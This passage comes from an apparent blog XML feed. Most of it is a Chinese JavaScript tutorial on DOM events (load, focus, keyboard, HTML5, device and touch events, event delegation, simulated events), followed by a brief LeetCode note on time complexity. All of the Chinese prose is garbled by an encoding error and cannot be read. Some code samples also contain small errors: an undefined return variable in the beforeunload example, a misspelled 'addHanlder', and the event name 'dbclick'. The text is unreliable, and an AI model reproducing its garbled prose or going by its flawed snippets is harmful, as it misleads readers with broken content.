è½½å®Œå(åŒ…æ‹¬æ‰€æœ‰å›¾åƒï¼Œjsæ–‡ä»¶ï¼Œcssæ–‡ä»¶ç­‰å¤–éƒ¨èµ„æº)ï¼Œå°±ä¼šè§¦å‘windowä¸Šçš„loadäº‹ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Loaded"</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&lt;body onload=<span class="string">"alert('Loaded')"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>å›¾åƒä¸Šä¹Ÿå¯ä»¥è§¦å‘loadäº‹ä»¶,å›¾åƒåŠ è½½å®Œæ¯•åè§¦å‘äº‹ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(imgElem, <span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"image loaded"</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&lt;img src=<span class="string">"1.jpg"</span> onload=<span class="string">"alert('image loaded')"</span>&gt;</span><br></pre></td></tr></table></figure></p><p><code>&lt;script&gt;</code>å…ƒç´ ä¹Ÿä¼šè§¦å‘loadäº‹ä»¶ï¼Œä»¥ä¾¿ç¡®å®šåŠ¨æ€åŠ è½½çš„jsæ–‡ä»¶æ˜¯å¦åŠ è½½å®Œæ¯•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">script.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">script.src = <span class="string">"1.js"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-ç„¦ç‚¹äº‹ä»¶"><a href="#5-2-ç„¦ç‚¹äº‹ä»¶" class="headerlink" title="5.2 ç„¦ç‚¹äº‹ä»¶"></a>5.2 ç„¦ç‚¹äº‹ä»¶</h4><p>ç„¦ç‚¹äº‹ä»¶ä¼šåœ¨é¡µé¢å…ƒç´ è·å¾—æˆ–å¤±å»ç„¦ç‚¹æ—¶è§¦å‘ã€‚åˆ©ç”¨è¿™äº›äº‹ä»¶ä¸<code>document.hasFocus()</code>åŠ<code>document.activeElement</code>å±æ€§é…åˆï¼Œå¯ä»¥çŸ¥æ™“ç”¨æˆ·åœ¨é¡µé¢ä¸Šçš„è¡Œè¸ªã€‚</p><ul><li>document.hasFocus()</li><li>document.activeElement</li><li>focus: åœ¨å…ƒç´ è·å¾—ç„¦ç‚¹æ—¶è§¦å‘</li><li>blur: åœ¨å…ƒç´ å¤±å»ç„¦ç‚¹æ—¶è§¦å‘</li></ul><p><br></p><h4 id="5-3-é¼ æ ‡ä¸æ»šè½®äº‹ä»¶"><a href="#5-3-é¼ æ ‡ä¸æ»šè½®äº‹ä»¶" class="headerlink" title="5.3 é¼ æ ‡ä¸æ»šè½®äº‹ä»¶"></a>5.3 é¼ æ ‡ä¸æ»šè½®äº‹ä»¶</h4><table><thead><tr><th>é¼ æ ‡äº‹ä»¶</th><th style="text-align:center">è¯´æ˜</th></tr></thead><tbody><tr><td>click</td><td style="text-align:center">å•å‡»ã€‚åªæœ‰åœ¨åŒä¸€ä¸ªå…ƒç´ ä¸Šç›¸ç»§è§¦å‘mousedownå’Œmouseupäº‹ä»¶ï¼Œæ‰ä¼šè§¦å‘clickäº‹ä»¶</td></tr><tr><td>dbclick</td><td style="text-align:center">åŒå‡»</td></tr><tr><td>mousedown</td><td style="text-align:center">ç”¨æˆ·æŒ‰ä¸‹ä»»æ„é¼ æ ‡æŒ‰é’®æ—¶è§¦å‘</td></tr><tr><td>mouseup</td><td style="text-align:center">ç”¨æˆ·é‡Šæ”¾é¼ æ ‡æŒ‰é’®æ—¶è§¦å‘</td></tr><tr><td>mouseenter</td><td style="text-align:center">å…‰æ ‡ä»å…ƒç´ å¤–éƒ¨é¦–æ¬¡ç§»åŠ¨åˆ°å…ƒç´ èŒƒå›´å†…è§¦å‘</td></tr><tr><td>mouseleave</td><td style="text-align:center">åœ¨ä½äºå…ƒç´ ä¸Šæ–¹çš„å…‰æ ‡ç§»åŠ¨åˆ°å…ƒç´ èŒƒå›´å¤–è§¦å‘</td></tr><tr><td>mousemove</td><td style="text-align:center">å½“å…‰æ ‡åœ¨å…ƒç´ å†…éƒ¨ç§»åŠ¨æ—¶é‡å¤è§¦å‘</td></tr><tr><td>mouseover</td><td style="text-align:center">é¼ æ ‡è¿›å…¥ï¼ŒåŒmouseover</td></tr><tr><td>mouseout</td><td style="text-align:center">é¼ æ ‡ç§»å‡º, åŒmouseout</td></tr></tbody></table><p>äº‹ä»¶è§¦å‘é¡ºåº: mousedown -&gt; mouseup -&gt; click</p><p><br></p><h4 id="5-4-é”®ç›˜äº‹ä»¶"><a href="#5-4-é”®ç›˜äº‹ä»¶" class="headerlink" title="5.4 é”®ç›˜äº‹ä»¶"></a>5.4 é”®ç›˜äº‹ä»¶</h4><table><thead><tr><th>é”®ç›˜äº‹ä»¶</th><th style="text-align:center">è¯´æ˜</th></tr></thead><tbody><tr><td>keydown</td><td style="text-align:center">å½“ç”¨æˆ·æŒ‰ä¸‹é”®ç›˜ä¸Šçš„ä»»æ„é”®æ—¶è§¦å‘ï¼Œé•¿æŒ‰ä¸æ”¾ï¼Œä¼šé‡å¤è§¦å‘</td></tr><tr><td>keypress</td><td style="text-align:center">å½“ç”¨æˆ·æŒ‰ä¸‹é”®ç›˜ä¸Šçš„å­—ç¬¦é”®æ—¶è§¦å‘ï¼Œé•¿æŒ‰ä¸æ”¾ï¼Œä¼šé‡å¤è§¦å‘</td></tr><tr><td>keyup</td><td style="text-align:center">å½“ç”¨æˆ·é‡Šæ”¾é”®ç›˜ä¸Šçš„é”®æ—¶è§¦å‘</td></tr></tbody></table><p>ç”¨æˆ·æŒ‰ä¸‹ä¸€ä¸ªå­—ç¬¦é”®æ—¶å€™ï¼Œä¼šä¾æ¬¡è§¦å‘ keydown -&gt; keypress -&gt; keyupã€‚</p><ul><li>event.keycCode éå­—ç¬¦é”®çš„é”®ç <br>åœ¨å‘ç”Ÿkeydownå’Œkeyupäº‹ä»¶æ—¶ï¼Œä¼šæœ‰ä¸€ä¸ªevent.keyCode,ä¸é”®ç›˜ä¸Šä¸€ä¸ªç‰¹å®šçš„é”®å¯¹åº”ã€‚</li></ul><ul><li>event.charCode å­—ç¬¦é”®çš„é”®ç <br>åªæœ‰åœ¨keypressçš„æ—¶å€™æ‰è§¦å‘ï¼Œ<code>event.charCode</code>æ˜¯é”®çš„asciiç ã€‚</li></ul><ul><li><p>event.key, event.keyIdentifier, event.keyLocation<br>DOM3çº§äº‹ä»¶çš„é”®ç›˜äº‹ä»¶ï¼Œä¸å†åŒ…å«charCodeå±æ€§ï¼Œè€ŒåŒ…å«äº†ä¸¤ä¸ªæ–°å±æ€§: keyå’Œcharã€‚<br><code>event.key</code>å¯¹åº”çš„æ˜¯ç›¸åº”çš„æ–‡æœ¬å­—ç¬¦(å¦‚k,M)ã€‚<br><code>event.keyIdentifier</code>è¿”å›ä¸€ä¸ªç±»ä¼¼â€U+0000â€çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºUnicodeå€¼ã€‚(chromeå’Œsafariæ”¯æŒ)<br><code>event.location || event.keyLocation</code>è¡¨ç¤ºæŒ‰ä¸‹äº†ä»€ä¹ˆä½ç½®ä¸Šçš„é”®: 0-é»˜è®¤é”®ç›˜ï¼Œ1-å·¦ä¾§ä½ç½®, 2-å³ä¾§ä½ç½®, 3-æ•°å­—å°é”®ç›˜, 4-ç§»åŠ¨è®¾å¤‡é”®ç›˜(è™šæ‹Ÿé”®ç›˜), 5-æ‰‹æŸ„ã€‚(IE9,safari,chromeæ”¯æŒ)</p></li><li><p>textInputäº‹ä»¶<br>DOM3å¼•å…¥äº†ä¸€ä¸ªæ–°äº‹ä»¶ï¼Œåªæœ‰å¯ç¼–è¾‘åŒºåŸŸæ‰èƒ½è§¦å‘textInputäº‹ä»¶ã€‚å®ƒçš„<code>event.data</code>å±æ€§ï¼Œå°±æ˜¯ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ã€‚<code>event.inputMethod</code>ï¼Œè¡¨ç¤ºæ–‡æœ¬è¾“å…¥åˆ°æ–‡æœ¬æ¡†ä¸­çš„æ–¹å¼ã€‚</p></li></ul><p><br></p><h4 id="5-5-html5äº‹ä»¶"><a href="#5-5-html5äº‹ä»¶" class="headerlink" title="5.5 html5äº‹ä»¶"></a>5.5 html5äº‹ä»¶</h4><h5 id="5-5-1-contextmenu"><a href="#5-5-1-contextmenu" class="headerlink" title="5.5.1 contextmenu"></a>5.5.1 contextmenu</h5><p>è®¾ç½®é¼ æ ‡å³å‡»èœå•<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line"></span><br><span class="line">  EventUtil.addHandler(div, <span class="string">'contextmenu'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    event = EventUtil.getEvent(event);</span><br><span class="line">    EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> menu = <span class="built_in">document</span>.getElementById(<span class="string">'myMenu'</span>);</span><br><span class="line">    menu.style.left = event.clientX + <span class="string">'px'</span>;</span><br><span class="line">    menu.style.top = event.clientY + <span class="string">'px'</span>;</span><br><span class="line">    menu.style.visibility = <span class="string">'visible'</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  EventUtil.addHandler(<span class="built_in">document</span>, <span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'myMenu'</span>).style.visibility = <span class="string">'hidden'</span>;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-5-2-beforeunload"><a href="#5-5-2-beforeunload" class="headerlink" title="5.5.2 beforeunload"></a>5.5.2 beforeunload</h5><p>IE, firefox, safari, chromeéƒ½æ”¯æŒ<code>beforeunload</code>äº‹ä»¶ï¼Œåœ¨æµè§ˆå™¨å¸è½½é¡µé¢ä¹‹å‰è¯¢é—®ç”¨æˆ·æ˜¯å¦çœŸçš„è¦å…³é—­é¡µé¢ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'beforeunload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  event.returnValue = <span class="string">"i'm really going to miss you if you go."</span>;</span><br><span class="line">  <span class="keyword">return</span> message;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-5-3-DOMContentLoaded"><a href="#5-5-3-DOMContentLoaded" class="headerlink" title="5.5.3 DOMContentLoaded"></a>5.5.3 DOMContentLoaded</h5><p>windowçš„loadäº‹ä»¶ä¼šåœ¨é¡µé¢ä¸­çš„ä¸€åˆ‡éƒ½åŠ è½½å®Œæ¯•æ—¶è§¦å‘ï¼ŒDOMContentLoadedäº‹ä»¶åˆ™ä¼šåœ¨å½¢æˆå®Œæ•´çš„DOMæ ‘ä¹‹åè§¦å‘ã€‚ä¸ç†ä¼šå›¾åƒï¼Œjs,cssæˆ–å…¶ä»–èµ„æºæ˜¯å¦å·²ç»ä¸‹è½½å®Œæ¯•ã€‚</p><p><br></p><h5 id="5-5-4-pageshow-pagehide"><a href="#5-5-4-pageshow-pagehide" class="headerlink" title="5.5.4 pageshow, pagehide"></a>5.5.4 pageshow, pagehide</h5><p><code>window.pageshow</code>é¡µé¢æ˜¾ç¤ºæ—¶è§¦å‘ã€‚ <code>window.pagehide</code>åœ¨æµè§ˆå™¨å¸è½½é¡µé¢æ—¶è§¦å‘ï¼Œåœ¨unloadäº‹æƒ…å‰è§¦å‘ã€‚</p><p><br></p><h5 id="5-5-5-hashchange"><a href="#5-5-5-hashchange" class="headerlink" title="5.5.5 hashchange"></a>5.5.5 hashchange</h5><p>åœ¨ajaxåº”ç”¨ä¸­ï¼Œå¼€å‘äººå‘˜ç»å¸¸è¦åˆ©ç”¨urlå‚æ•°æ¥ä¿å­˜çŠ¶æ€æˆ–å¯¼èˆªä¿¡æ¯ã€‚urlä¸­#å·åé¢çš„å­—ç¬¦ä¸²å‘ç”Ÿå˜åŒ–æ—¶, hashchangeäº‹ä»¶å°±ä¼šè¢«è§¦å‘ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'current hash:'</span> + location.hash);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-6-è®¾å¤‡äº‹ä»¶"><a href="#5-6-è®¾å¤‡äº‹ä»¶" class="headerlink" title="5.6 è®¾å¤‡äº‹ä»¶"></a>5.6 è®¾å¤‡äº‹ä»¶</h4><h5 id="5-6-1-orientationchange"><a href="#5-6-1-orientationchange" class="headerlink" title="5.6. 1 orientationchange"></a>5.6. 1 orientationchange</h5><p>è‹¹æœsafariæ·»åŠ äº†orientationchangeæ—¶é—´ï¼Œç¡®å®šç”¨æˆ·ä½•æ—¶å°†è®¾å¤‡ç”±æ¨ªå‘æŸ¥çœ‹æ¨¡å¼åˆ‡æ¢ä¸ºçºµå‘æŸ¥çœ‹æ¨¡å¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHanlder(<span class="built_in">window</span>, <span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 0 è‚–åƒæ¨¡å¼ï¼Œ90 å·¦æ—‹è½¬çš„æ¨ªå‘æ¨¡å¼ï¼Œ -90 å³æ—‹è½¬çš„æ¨ªå‘æ¨¡å¼</span></span><br><span class="line">  div.innerHTML = <span class="string">'Current orientation is'</span> + <span class="built_in">window</span>.orientation;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-6-2-deviceorientation"><a href="#5-6-2-deviceorientation" class="headerlink" title="5.6.2 deviceorientation"></a>5.6.2 deviceorientation</h5><p>è¡¨ç¤ºè®¾å¤‡åœ¨ç©ºé—´ä¸­æœå‘å“ªé‡Œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'deviceorientation'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// alpha, beta, gammaåˆ†åˆ«æŒ‡ç¤ºå›´ç»•z,x,yè½´æ—‹è½¬æ—¶yè½´ï¼Œzè½´ï¼Œzè½´çš„åº¦æ•°å·®</span></span><br><span class="line">  <span class="built_in">console</span>.log(event.alpha + event.beta + event.gamma);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-6-3-devicemotion"><a href="#5-6-3-devicemotion" class="headerlink" title="5.6.3 devicemotion"></a>5.6.3 devicemotion</h5><p>è¡¨ç¤ºè®¾å¤‡ä»€ä¹ˆæ—¶å€™ç§»åŠ¨ã€‚äº‹ä»¶å¯¹è±¡åŒ…å«ä»¥ä¸‹å±æ€§: accelerationæ¯ä¸ªæ–¹å‘ä¸Šçš„åŠ é€Ÿåº¦; accelerationIncludingGravityåœ¨è€ƒè™‘zè½´è‡ªç„¶é‡åŠ›åŠ é€Ÿåº¦çš„æƒ…å†µä¸‹ï¼Œå‘Šè¯‰ä½ åœ¨æ¯ä¸ªæ–¹å‘ä¸Šçš„åŠ é€Ÿåº¦ã€‚rotationRateæ–¹å‘å€¼ã€‚</p><p><br></p><h4 id="5-7-è§¦æ‘¸ä¸æ‰‹åŠ¿äº‹ä»¶"><a href="#5-7-è§¦æ‘¸ä¸æ‰‹åŠ¿äº‹ä»¶" class="headerlink" title="5.7 è§¦æ‘¸ä¸æ‰‹åŠ¿äº‹ä»¶"></a>5.7 è§¦æ‘¸ä¸æ‰‹åŠ¿äº‹ä»¶</h4><p>touchstart    : å½“æ‰‹æŒ‡è§¦æ‘¸å±å¹•æ—¶è§¦å‘<br>touchmove     : å½“æ‰‹æŒ‡åœ¨å±å¹•ä¸Šæ»‘åŠ¨æ—¶è¿ç»­ç¬¬è§¦å‘<br>touchend      : å½“æ‰‹æŒ‡åœ¨å±å¹•ä¸Šç§»å¼€æ—¶è§¦å‘<br>touchcancel   : å½“ç³»ç»Ÿåœæ­¢è·Ÿè¸ªè§¦æ‘¸æ—¶è§¦å‘</p><p>åªæœ‰ä¸¤ä¸ªæ‰‹æŒ‡éƒ½è§¦æ‘¸ï¼Œæ‰ä¼šè§¦å‘è¿™äº›äº‹ä»¶<br>gesturestart  : å½“ä¸€ä¸ªæ‰‹æŒ‡å·²ç»æŒ‰åœ¨å±å¹•ä¸Šè€Œå¦ä¸€ä¸ªæ‰‹æŒ‡åˆè§¦æ‘¸å±å¹•æ—¶è§¦å‘<br>gesturechange : å½“è§¦æ‘¸å±å¹•çš„ä»»ä½•ä¸€ä¸ªæ‰‹æŒ‡çš„ä½ç½®å‘ç”Ÿå˜åŒ–æ—¶è§¦å‘<br>gestureend    : å½“ä»»ä½•ä¸€ä¸ªæ‰‹æŒ‡ä»å±å¹•ä¸Šé¢ç§»å¼€æ—¶è§¦å‘</p><p><br></p><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><ul><li><p><em>unload</em><br><code>window.onunload</code> åœ¨æ–‡æ¡£è¢«å®Œå…¨å¸è½½åè§¦å‘ã€‚åªè¦ç”¨æˆ·ä»ä¸€ä¸ªé¡µé¢åˆ‡æ¢åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œå°±ä¼šå‘ç”Ÿunloadäº‹ä»¶ã€‚è¿™ä¸ªäº‹ä»¶æœ€å¤šçš„æƒ…å†µæ˜¯æ¸…é™¤å¼•ç”¨ï¼Œä»¥é¿å…å†…å­˜æ³„éœ²ã€‚</p></li><li><p><em>resize</em><br><code>window.onresize</code> æµè§ˆå™¨çª—å£è¢«è°ƒæ•´åˆ°ä¸€ä¸ªæ–°çš„é«˜åº¦æˆ–å®½åº¦æ—¶è§¦å‘</p></li><li><p><em>scroll</em><br><code>window.scroll</code> åœ¨æ–‡æ¡£è¢«æ»šåŠ¨æœŸé—´é‡å¤è§¦å‘</p></li><li><p><em>DOMå˜åŠ¨äº‹ä»¶</em><br><code>DOMNodeRemoved</code>ä¼šåœ¨ä½¿ç”¨removeChild()æˆ–replaceChild()åˆ é™¤ç»“ç‚¹æ—¶è§¦å‘ï¼Œevent.targetæ˜¯è¢«åˆ é™¤çš„èŠ‚ç‚¹ï¼Œevent.relatedNodeåŒ…å«ç€ç›®æ ‡èŠ‚ç‚¹çˆ¶èŠ‚ç‚¹çš„å¼•ç”¨ã€‚<br><code>DOMNodeInserted</code>ä¼šåœ¨appendChild(), replaceChild(), insertBefore()æ’å…¥èŠ‚ç‚¹æ—¶è§¦å‘ã€‚</p></li></ul><p><br></p><h3 id="6-å†…å­˜ä¸æ€§èƒ½"><a href="#6-å†…å­˜ä¸æ€§èƒ½" class="headerlink" title="6. å†…å­˜ä¸æ€§èƒ½"></a>6. å†…å­˜ä¸æ€§èƒ½</h3><h4 id="6-1-äº‹ä»¶å§”æ‰˜"><a href="#6-1-äº‹ä»¶å§”æ‰˜" class="headerlink" title="6.1 äº‹ä»¶å§”æ‰˜"></a>6.1 äº‹ä»¶å§”æ‰˜</h4><p>å¯¹â€œäº‹ä»¶å¤„ç†ç¨‹åºè¿‡å¤šâ€é—®é¢˜çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯<em>äº‹ä»¶å§”æ‰˜</em>ã€‚äº‹ä»¶å§”æ‰˜åˆ©ç”¨äº†äº‹ä»¶å†’æ³¡ï¼Œä¸ºæ•´ä¸ªé¡µé¢æŒ‡å®šä¸€ä¸ªonclickäº‹ä»¶å¤„ç†ç¨‹åºï¼Œè€Œä¸å¿…ä¸ºæ¯ä¸ªå¯å•å‡»çš„å…ƒç´ åˆ†åˆ«æ·»åŠ äº‹ä»¶å¤„ç†ç¨‹åºã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(list, <span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> event = EventUtil.getEvent(event);</span><br><span class="line">  <span class="keyword">var</span> target = EventUtil.getTarget(event);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(target.id)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'doSomething'</span>:</span><br><span class="line">      doSomething();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>documentå¯¹è±¡å¾ˆå¿«å°±å¯ä»¥è®¿é—®ï¼Œå¯ä»¥åœ¨é¡µé¢ç”Ÿå‘½å‘¨æœŸçš„ä»»ä½•æ—¶ç‚¹ä¸Šä¸ºå®ƒæ·»åŠ äº‹ä»¶å¤„ç†ç¨‹åºï¼ˆæ— éœ€ç­‰å¾…DOMContentLoadedæˆ–loadäº‹ä»¶ï¼‰ã€‚åªè¦å¯å•å‡»çš„å…ƒç´ å‘ˆç°åœ¨é¡µé¢ä¸Šï¼Œå°±å¯ä»¥ç«‹å³å…·å¤‡é€‚å½“çš„å·¥é¥ã€‚åªæ·»åŠ ä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºæ‰€éœ€çš„DOMå¼•ç”¨æ›´å°‘ï¼Œå ç”¨çš„å†…å­˜ç©ºé—´æ›´å°‘ï¼Œæ‰€èŠ±çš„æ—¶é—´ä¹Ÿæ›´å°‘ã€‚<br><br></p><h4 id="6-2-æ¨¡æ‹Ÿäº‹ä»¶"><a href="#6-2-æ¨¡æ‹Ÿäº‹ä»¶" class="headerlink" title="6.2 æ¨¡æ‹Ÿäº‹ä»¶"></a>6.2 æ¨¡æ‹Ÿäº‹ä»¶</h4><p><code>createEvent</code>å¯ä»¥åˆ›å»ºäº‹ä»¶ï¼Œé€šè¿‡<code>dispatchEvent</code>è§¦å‘äº‹ä»¶ã€‚<br>UIEvent é¼ æ ‡äº‹ä»¶å’Œé”®ç›˜äº‹ä»¶, MouseEvents é¼ æ ‡äº‹ä»¶, MutationEvents DOMå˜åŠ¨äº‹ä»¶,HTMLEvents HTMLäº‹ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è§¦å‘æŒ‰é’®ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"myBtn"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºäº‹ä»¶å¯¹è±¡</span></span><br><span class="line"><span class="keyword">var</span> event = <span class="built_in">document</span>.createEvent(<span class="string">"MouseEvents"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–äº‹ä»¶å¯¹è±¡</span></span><br><span class="line">event.initMouseEvent(<span class="string">"click"</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="built_in">document</span>.defaultView, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="number">0</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è§¦å‘äº‹ä»¶</span></span><br><span class="line">btn.dispatchEvent(event);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li>ã€ŠJavascripté«˜çº§ç¨‹åºè®¾è®¡ã€‹ç¬¬13ç«  äº‹ä»¶</li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ•°æ®ç»“æ„ä¸ç®—æ³•æ€»è§ˆ</title>
      <link href="/2019/03/14/LeetCode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%80%BB%E8%A7%88/"/>
      <url>/2019/03/14/LeetCode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%80%BB%E8%A7%88/</url>
      <content type="html"><![CDATA[<blockquote><p>LeetCode JSé¢˜è§£: <a href="https://github.com/ufresh2013/-algorithm015" target="_blank" rel="noopener">https://github.com/ufresh2013/-algorithm015</a></p></blockquote><h3 id="1-æ—¶é—´å¤æ‚åº¦ã€ç©ºé—´å¤æ‚åº¦"><a href="#1-æ—¶é—´å¤æ‚åº¦ã€ç©ºé—´å¤æ‚åº¦" class="headerlink" title="1. æ—¶é—´å¤æ‚åº¦ã€ç©ºé—´å¤æ‚åº¦"></a>1. æ—¶é—´å¤æ‚åº¦ã€ç©ºé—´å¤æ‚åº¦</h3><p><code>O(1)</code>: å“ˆå¸Œè¡¨(JSå¯¹è±¡)ï¼Œæ ¹æ®keyå°±å¯ä»¥ç›´æ¥æ‹¿åˆ°val<br><code>O(n)</code>: å¤§å¤šæ•°éå†ï¼Œæ¯”å¦‚æ•°æ•°ï¼Œä»1æ•°åˆ°100<br><code>O(nÂ²)</code>:åŒé‡å¾ªç¯ï¼Œæ¯”å¦‚æ’åº(å†’æ³¡ã€é€‰æ‹©)ï¼Œæ¯ä¸ªå…ƒç´ éƒ½éœ€è¦å…¶ä»–å…ƒç´ æ¯”è¾ƒæ”¾ç½®<br><code>O(logn)</code>: äºŒåˆ†æŸ¥æ‰¾/äºŒå‰æ ‘æœç´¢ï¼Œæ¯æ¬¡æŸ¥æ‰¾çš„èŒƒå›´éƒ½/2<br><code>O(nlogn)</code>: å¿«æ’<br><code>O(2^n)</code>: é€’å½’</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.zhihu.com/question/21387264" target="_blank" rel="noopener">å¦‚ä½•ç†è§£ç®—æ³•æ—¶é—´å¤æ‚åº¦çš„è¡¨ç¤ºæ³•ï¼Œä¾‹å¦‚ O(nÂ²)ã€O(n)ã€O(1)ã€O(nlogn) ç­‰ï¼Ÿ</a></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ•°æ®ç»“æ„ä¸ç®—æ³•ï¼ˆå°äº‰å“¥ï¼‰</title>
